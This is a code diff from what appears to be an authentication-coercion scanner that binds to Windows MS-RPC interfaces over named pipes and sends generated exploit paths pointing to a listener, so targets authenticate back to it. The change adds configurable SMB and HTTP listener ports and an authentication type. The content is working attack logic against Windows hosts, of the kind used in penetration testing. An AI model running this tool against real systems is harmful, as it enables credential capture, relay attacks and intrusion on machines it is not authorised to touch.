@@ -55,7 +55,7 @@ def action_scan(target, available_methods, options, credentials, reporter):
     # Executing tasks =======================================================================================================================
     listening_ip = get_ip_addr_to_listen_on(target, options)
     if options.verbose:
-        print("[+] Listening for authentications on '%s'" % listening_ip)
+        print("[+] Listening for authentications on '%s', SMB port %d" % (listening_ip, options.smb_port))
     # Processing ncan_np tasks
     ncan_np_tasks = tasks["ncan_np"]
     for namedpipe in sorted(ncan_np_tasks.keys()):
@@ -67,7 +67,7 @@ def action_scan(target, available_methods, options, credentials, reporter):
                         print("   [+] Successful bind to interface (%s, %s)!" % (uuid, version))
                         for msprotocol_class in sorted(ncan_np_tasks[namedpipe][uuid][version], key=lambda x:x.function["name"]):
 
-                            exploit_paths = msprotocol_class.generate_exploit_templates()
+                            exploit_paths = msprotocol_class.generate_exploit_templates(desired_auth_type=options.auth_type)
 
                             stop_exploiting_this_function = False
                             for listener_type, exploitpath in exploit_paths:
@@ -76,7 +76,12 @@ def action_scan(target, available_methods, options, credentials, reporter):
                                     continue
                                 if listener_type == "http":
                                     http_listen_port = get_next_http_listener_port(current_value=http_listen_port, listen_ip=listening_ip, options=options)
-                                exploitpath = generate_exploit_path_from_template(template=exploitpath, listener=listening_ip, port=http_listen_port)
+                                exploitpath = generate_exploit_path_from_template(
+                                    template=exploitpath,
+                                    listener=listening_ip,
+                                    http_listen_port=options.http_port,
+                                    smb_listen_port=options.smb_port
+                                )
 
                                 msprotocol_rpc_instance = msprotocol_class(path=exploitpath)
                                 dcerpc = DCERPCSession(credentials=credentials, verbose=True)
